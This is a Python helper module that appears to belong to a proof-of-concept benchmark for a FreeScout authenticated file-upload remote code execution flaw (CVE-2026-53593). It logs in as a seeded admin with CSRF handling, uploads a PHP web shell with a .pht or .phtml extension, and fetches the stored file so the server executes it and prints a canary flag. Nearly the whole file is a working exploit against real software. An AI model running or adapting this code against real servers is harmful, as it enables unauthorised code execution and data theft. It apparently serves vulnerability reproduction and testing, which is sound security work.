#!/usr/bin/env python3
"""Shared plumbing for freescout-cve-2026-53593 (authenticated .pht/.phtml upload RCE).

Login as the seeded admin via the REAL FreeScout login flow (session + CSRF),
POST /uploads/upload a PHP web shell, then GET the stored file so Apache/mod_php
executes it and echoes /canary.txt (the 43-byte PCBFLAG_* token).
"""
import http.cookiejar
import json
import os
import re
import urllib.parse
import urllib.request

APP_HOST = {"v0": 33660, "v1": 33661, "v2": 33662}
_pt = os.environ.get("PCB_APP_PORT") or os.environ.get("PCB_TARGET_PORT")
if _pt and str(_pt).isdigit():
    for _v in APP_HOST:
        APP_HOST[_v] = int(_pt)

APP_SVC = {"v0": "v0", "v1": "v1", "v2": "v2"}
EMAIL = "admin@pcb.local"
PASSWORD = "PcbAdminPass123"


class _RewriteAppRedirect(urllib.request.HTTPRedirectHandler):
    """APP_URL is http://v0|v1; rewrite those redirects back to the published host port."""

    def __init__(self, port):
        self.port = int(port)

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        for name in ("v0", "v1", "v2"):
            prefix = "http://%s" % name
            if newurl.startswith(prefix):
                newurl = "http://127.0.0.1:%d" % self.port + newurl[len(prefix):]
                break
        return super().redirect_request(req, fp, code, msg, headers, newurl)


def _make_opener(port):
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        _RewriteAppRedirect(port),
    )


def _csrf_from(html):
    m = re.search(r'name="csrf-token" content="([^"]+)"', html) or re.search(
        r'name="_token" value="([^"]+)"', html
    )
    return m.group(1) if m else None


def login(version):
    port = APP_HOST[version]
    host = APP_SVC[version]
    base = "http://127.0.0.1:%d" % port
    opener = _make_opener(port)
    req = urllib.request.Request(base + "/login", headers={"Host": host})
    with opener.open(req, timeout=30) as r:
        html = r.read().decode("utf-8", "replace")
    token = _csrf_from(html)
    if not token:
        return {"error": "no csrf on login page"}
    data = urllib.parse.urlencode(
        {"email": EMAIL, "password": PASSWORD, "_token": token, "remember": "1"}
    ).encode()
    req = urllib.request.Request(base + "/login", data=data, headers={"Host": host})
    try:
        with opener.open(req, timeout=30) as r:
            r.read()
    except Exception:
        pass
    try:
        req = urllib.request.Request(base + "/mailbox/1", headers={"Host": host})
        with opener.open(req, timeout=30) as r:
            html = r.read().decode("utf-8", "replace")
        token2 = _csrf_from(html) or token
    except Exception:
        token2 = token
    return {"opener": opener, "csrf": token2}


def upload_and_exec(version, extension):
    lr = login(version)
    if "error" in lr:
        return {"status": 500, "body": json.dumps(lr), "link_check": ""}
    opener, csrf = lr["opener"], lr["csrf"]
    port = APP_HOST[version]
    host = APP_SVC[version]
    base = "http://127.0.0.1:%d" % port
    # Echo the full canary token (43-byte PCBFLAG_*). No truncation.
    shell = "<?php echo file_get_contents('/canary.txt');"
    boundary = "----pcbformboundary123456"
    body = (
        "--%s\r\n"
        'Content-Disposition: form-data; name="file"; filename="shell.%s"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
        "%s\r\n"
        "--%s--\r\n" % (boundary, extension, shell, boundary)
    ).encode()
    req = urllib.request.Request(
        base + "/uploads/upload",
        data=body,
        method="POST",
        headers={
            "Content-Type": "multipart/form-data; boundary=%s" % boundary,
            "X-CSRF-TOKEN": csrf,
            "X-Requested-With": "XMLHttpRequest",
            "Host": host,
        },
    )
    try:
        with opener.open(req, timeout=30) as r:
            resp = json.loads(r.read().decode("utf-8", "replace"))
    except Exception as e:
        return {"status": getattr(e, "code", 500), "body": str(e)[:200], "link_check": ""}
    url = resp.get("url", "")
    if not url:
        return {"status": 500, "body": "upload resp: %s" % resp, "link_check": ""}
    path = url.split("/storage/")[-1]
    exec_url = "%s/storage/%s" % (base, path)
    try:
        req = urllib.request.Request(exec_url, headers={"Host": host})
        with opener.open(req, timeout=30) as r:
            return {"status": r.status, "body": r.read().decode("utf-8", "replace"), "link_check": exec_url}
    except Exception as e:
        return {"status": getattr(e, "code", 500), "body": str(e)[:200], "link_check": exec_url}
